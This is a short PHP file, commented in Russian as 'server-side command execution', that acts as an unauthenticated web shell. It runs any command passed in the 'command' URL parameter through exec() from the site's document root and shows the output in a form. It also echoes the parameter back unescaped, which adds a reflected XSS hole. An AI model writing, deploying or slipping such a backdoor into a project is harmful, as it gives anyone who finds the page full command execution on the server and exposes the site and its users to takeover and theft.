<?php
/**
 * Выполнение команд на стороне сервера
 */
chdir($_SERVER['DOCUMENT_ROOT']);
$output='';$done='';
if(!empty($_GET['command'])) {
	set_time_limit(0);
	exec($_GET['command'], $output);
	$done='<br/>done!';
}
?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="window-1251" />
	</head>
	<body>
<form>
  <b>command line:</b>
  <input style="width:100%;" name="command" value="<?=@$_GET['command']?>"/>
  <input type="submit" value="exec" style="margin-top:5px;width:200px;height:40px" />
</form>
<pre><?=@implode("\n", $output)?></pre>
<strong><?=$done?></strong>
	</body>
</html>